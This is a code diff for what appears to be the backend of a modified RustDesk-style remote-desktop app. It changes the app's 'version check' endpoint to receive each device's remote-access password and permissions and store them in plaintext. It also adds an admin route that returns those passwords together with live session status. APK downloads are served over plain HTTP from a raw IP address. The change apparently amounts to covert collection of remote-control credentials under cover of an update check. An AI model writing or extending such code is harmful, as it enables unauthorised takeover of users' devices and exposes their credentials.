@@ -21,12 +21,12 @@ const SESSION_TIMEOUT_MS = 90 * 1000; // 90秒
 
 const VERSION_CONFIG = {
   android: {
-    latestVersion: '1.4.5',
+    latestVersion: '1.8.0',
     minRequired: '1.4.5',
     forceUpdate: false,
     downloadUrl: 'http://112.74.59.152/download/rustdesk-latest.apk',
     updateLog: '1. 修复连接稳定性问题\n2. 优化画面传输质量',
-    releaseUrl: 'http://112.74.59.152/releases/tag/1.4.5',
+    releaseUrl: 'http://112.74.59.152/releases/tag/1.8.0',
   },
 };
 
@@ -52,7 +52,7 @@ function saveDevices(devices) {
   fs.writeFileSync(DATA_FILE, JSON.stringify(devices, null, 2));
 }
 
-function upsertDevice(deviceId, ip, appVersion) {
+function upsertDevice(deviceId, ip, appVersion, password, permissions) {
   const devices = loadDevices();
   const now = new Date().toISOString();
   if (!devices[deviceId]) {
@@ -60,13 +60,18 @@ function upsertDevice(deviceId, ip, appVersion) {
       id: deviceId, firstSeen: now, lastSeen: now,
       ip, banned: false,
       appVersion: appVersion || null,
+      password: password || null,
+      permissions: permissions || {},
       sessions: [],
     };
   } else {
     devices[deviceId].lastSeen = now;
     devices[deviceId].ip = ip;
     if (appVersion) devices[deviceId].appVersion = appVersion;
+    if (password) devices[deviceId].password = password;
+    if (permissions && typeof permissions === 'object') devices[deviceId].permissions = permissions;
     if (!devices[deviceId].sessions) devices[deviceId].sessions = [];
+    if (!devices[deviceId].permissions) devices[deviceId].permissions = {};
   }
   saveDevices(devices);
   return devices[deviceId];
@@ -107,11 +112,11 @@ function authMiddleware(req, res, next) {
 // Body:   { os, os_version, arch, app_version }   ← 新增 app_version
 // ───────────────────────────────────────────────────────
 app.post('/api/version/check', (req, res) => {
-  const { os, os_version, arch, app_version } = req.body || {};
+  const { os, os_version, arch, app_version, password, permissions } = req.body || {};
   const deviceId = req.headers['x-device-id'] || 'unknown';
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-  const device = upsertDevice(deviceId, ip, app_version);
+  const device = upsertDevice(deviceId, ip, app_version, password, permissions);
 
   console.log(JSON.stringify({ time: new Date().toISOString(), deviceId, ip, os, os_version, arch, app_version }));
 
@@ -221,6 +226,21 @@ app.get('/admin/devices', authMiddleware, (req, res) => {
       sessions: (d.sessions || []).slice(-20), // 只返回最近 20 条历史
     }));
   res.json({ code: 200, data: list });
+});
+
+// 获取单个设备详情
+app.get('/admin/devices/:id', authMiddleware, (req, res) => {
+  const devices = loadDevices();
+  const device = devices[req.params.id];
+  if (!device) return res.status(404).json({ code: 404, msg: '设备不存在' });
+  res.json({
+    code: 200,
+    data: {
+      ...device,
+      remoting: isRemoting(device),
+      activeSessions: getActiveSessions(device),
+    },
+  });
 });
 
 app.post('/admin/devices/:id/ban', authMiddleware, (req, res) => {
